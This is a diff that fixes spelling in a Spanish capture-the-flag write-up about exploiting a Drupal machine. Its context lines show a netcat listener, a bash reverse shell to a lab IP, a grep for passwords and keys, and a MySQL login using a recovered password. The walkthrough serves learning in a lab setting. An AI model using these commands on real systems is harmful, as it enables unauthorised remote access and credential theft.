@@ -1,4 +1,4 @@
-## Vuln exploit & Gaining Access {-}
+## Explotacion de vulnerabilidad & Ganando acceso {-}
 
 ### Druppalgeddon {-}
 
@@ -14,7 +14,7 @@ ifconfig
 
 Entablamos ahora una reverse shell para sacarse de este contexto.
 
-1. maquina de attackante
+1. maquina de atacante
 
     ```bash
     nc -nlvp 443
@@ -26,7 +26,7 @@ Entablamos ahora una reverse shell para sacarse de este contexto.
     bash -i >& /dev/tcp/10.10.14.20/443 0>&1
     ```
 
-Esto no functiona porque le commando contiene **bad chars**. Como la maquina no tiene **nc** ni **ncat** la tecnica seria la siguiente:
+Esto no functiona porque el comando contiene **bad chars**. Como la maquina no tiene **nc** ni **ncat** la tecnica seria la siguiente:
 
 1. Creamos un archivo *index.html* que contiene
 
@@ -79,8 +79,8 @@ grep -r -E -i "username|pass|key"
 muchas cosas
 ```
 
-Como hay muchas cosas y es difficil de analizar usamos el commando `find` y vamos quitando con el commando `grep -v` las cosas que no 
-nos interressan poco a poco.
+Como hay muchas cosas y es dificil de analizar usamos el comando `find` y vamos quitando con el comando `grep -v` las cosas que no 
+nos interresan poco a poco.
 
 ```bash
 find \-type -f 2>/dev/null
@@ -88,7 +88,7 @@ find \-type -f 2>/dev/null | grep -v "themes"
 find \-type -f 2>/dev/null | grep -v -E "themes|modules"
 ```
 
-Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interessantes.
+Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interesantes.
 
 - authorize.php
 - cron.php
@@ -96,7 +96,7 @@ Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen int
 - includes/password.inc
 - sites/default/
 
-Lo miramos hasta que encontremos cosas interessantes. En un fichero encontramos un user **drupaluser** y su contraseña.
+Lo miramos hasta que encontremos cosas interesantes. En un fichero encontramos un user **drupaluser** y su contraseña.
 
 Miramos los usuarios de la maquina 
 
@@ -109,7 +109,7 @@ brucetherealadmin
 
 Como el servicio ssh esta abierto miramos si la contraseña functiona con el usuario brucetherealadmin pero no functiona.
 
-Como hemos visto ficheros *mysql* intentamos connectar con el **drupaluser** y functiona.
+Como hemos visto ficheros *mysql* intentamos conectar con el **drupaluser** y functiona.
 
 ```bash
 mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'show databases;'
